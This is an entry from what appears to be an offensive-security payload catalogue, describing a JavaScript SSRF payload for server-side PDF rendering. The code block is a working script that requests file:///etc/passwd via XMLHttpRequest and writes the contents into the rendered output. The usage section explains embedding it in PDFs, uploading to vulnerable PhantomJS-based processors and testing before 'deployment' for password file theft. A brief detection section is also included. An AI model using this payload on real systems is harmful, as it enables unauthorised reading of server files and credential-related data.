---
id: 7e6dd4ee-f974-4900-8c3b-e3b96e728f77
type: code
name: JavaScript-XMLHttpRequest-for-SSRF-File-Exfiltration
language: js
verified: true
created_at: '2023-04-06T03:56:38.080571+00:00'
updated_at: '2023-04-10T20:24:10.903477+00:00'
tags:
  - ssrf
  - javascript-payload
  - file-exfiltration
platforms:
  - Web
  - Linux
validated: true
---

# JavaScript-XMLHttpRequest-for-SSRF-File-Exfiltration

## Code

```js
<script>
    exfil = new XMLHttpRequest();
    exfil.open("GET","file:///etc/passwd");
    exfil.send();
    exfil.onload = function(){document.write(this.responseText);}
    exfil.onerror = function(){document.write('failed!')}
</script>
```

## Description

This JavaScript code uses XMLHttpRequest to perform an SSRF attack by requesting a local file like /etc/passwd and writing its contents to the document upon success. Embedded in a PDF, it executes during server-side rendering, exfiltrating data back in the response.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| file:///etc/passwd | Target internal file path | file:///etc/passwd |

## Usage

Embed in PDF JavaScript actions or forms, upload to a vulnerable processor like PhantomJS-enabled apps. Test locally with PhantomJS before deployment. Integrated in [[procedures/Exploit-SSRF-via-PDF-to-Read-Sensitive-Files]] for password file theft.

## Detection

- Enable JavaScript logging in PDF renderers and scan for XMLHttpRequest to file:// URIs.
- Monitor document.write calls with unexpected content lengths.
- Network logs showing internal file requests from web processes.
